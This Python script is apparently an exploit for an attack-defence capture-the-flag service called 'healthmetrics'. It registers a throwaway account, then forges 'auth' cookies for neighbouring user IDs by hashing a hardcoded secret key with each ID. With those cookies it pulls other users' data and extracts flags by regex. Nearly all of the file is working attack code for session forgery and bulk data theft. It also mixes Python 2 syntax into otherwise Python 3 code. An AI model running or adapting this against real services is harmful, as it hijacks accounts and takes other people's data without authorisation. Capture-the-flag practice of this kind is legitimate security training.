#!/usr/bin/env python
"""This is an exploit template which includes some functions that should
make the process of writing exploits quicker and easier."""
import sys
import re
import socket
import requests
import pickle
import os
import hashlib
import base64
import random
import logging

# Recommended for HTTP related tasks
# Docs: http://docs.python-requests.org/en/latest/
import requests

if sys.version_info > (3,0,0):
    xrange = range

def get_by_http(url):
    response = requests.get(url)
    return response.text

key  ='f11ecd5521ddf2614e17e4fb074a86da'
#key  ='f11ecd5521ddf2614e17e4fb074a86da_dahsduiahsduiahduihuiwed83e72093482093jd08348209ejdiwe0r9230923u'

flagRegex = re.compile('\w{31}=')
userIDRegex = re.compile('id assigned: u_(\d+)')


def recv_until(socket, end=']', data_max=1024*1024*16):
    """This function reads from a socket until it hits whats defined in end.
    If end is empty, it will recieve all data."""
    total_data=[]
    data=''
    # We will only recieve data to a certain maximum, just to be more robust.
    part_size=8192
    part_amount=data_max/part_size
    for part_id in xrange(part_amount):
        data=socket.recv(8192)
        if not data:
            break
        if end and end in data:
            total_data.append(data[:data.find(end)])
            break
        total_data.append(data)
        if len(total_data)>1:
            last_pair=total_data[-2]+total_data[-1]
            if end in last_pair:
                total_data[-2]=last_pair[:last_pair.find(end)]
                total_data.pop()
                break
    return ''.join(total_data)

def recv_all(socket, data_max=1024*1024*16):
    recv_until(socket, end='', data_max=data_max)

def loadUserIDs():
    if os.path.isfile('/tmp/lastUserIDs.dump'):
        dumpFile = open('/tmp/lastUserIDs.dump', 'rw')
        lastUserIDs = pickle.load(dumpFile)
        dumpFile.close()
    else:
        lastUserIDs = {}

    return lastUserIDs

def saveLastUserIDs(lastUserIDs):
    dumpFile = open('/tmp/lastUserIDs.dump', 'rw')
    pickle.dump(lastUserIDs, dumpFile)
    dumpFile.flush()
    dumpFile.close()

def buildCookieDict(userID):
    cookies={}
    md5 = hashlib.md5()
    md5.update(key)
    md5.update('u_'+str(userID))

    cookies['auth']=md5.hexdigest()
    cookies['id']=base64.b64encode('u_'+str(userID))

    return cookies

def getNewUserID(targetIP, targetPort):
    user = hashlib.md5(str(random.getrandbits(128))).hexdigest()
    pwd = hashlib.md5(str(random.getrandbits(128))).hexdigest()
    response = requests.post('http://'+str(targetIP)+':'+str(targetPort)+'/newuser', {'Login':user, 'Pass':pwd}, headers={'User-Agent':'-'})
    match = userIDRegex.search(response.text)
    logging.debug('New User ID:' + match.group(1))
    return int(match.group(1))


def exploit(targetIP, targetPort):
    logging.basicConfig(filename='hm_exploit.log',level=logging.DEBUG)
    logging.debug('Attack '+ str(targetIP) + ':' + str(targetPort))

    #lastUserIDByIP = loadUserIDs()
    #lastUserID = lastUserIDByIP.get(str(targetIP),1)


    newUserID = getNewUserID(targetIP, targetPort)

    userID = max(newUserID - 40, 1)

    allFlags=[]
    while userID < newUserID + 20:
        logging.debug('User ID: '+str(userID))
        cookies = buildCookieDict(userID)
        try:
            response = requests.get('http://'+str(targetIP)+':'+str(targetPort)+'/healthmetrics', cookies=cookies, headers={'User-Agent':'-'})
            if response.text.find('Authentication failed.') >= 0:
                break

            flags = flagRegex.findall(response.text)
            for flag in flags:
                allFlags.append(flag)
        except Exception, e:
            logging.WARNING(e.message)

        userID += 1

    #lastUserIDByIP[str(targetIP)] = userID
    #saveLastUserIDs(lastUserIDByIP)

    return allFlags

def main(targetIP, targetPort):
    try:
        flags = exploit(targetIP, targetPort)

        # The exploit only needs to print the flags, one per line.
        for flag in flags:
            print(flag)

        return 0
    except Exception as e:
        print(e)
        return 1

if __name__ == '__main__':
    # Read ip and port from commandline
    targetIP = sys.argv[1]
    targetPort = sys.argv[2]
    sys.exit(main(targetIP, targetPort))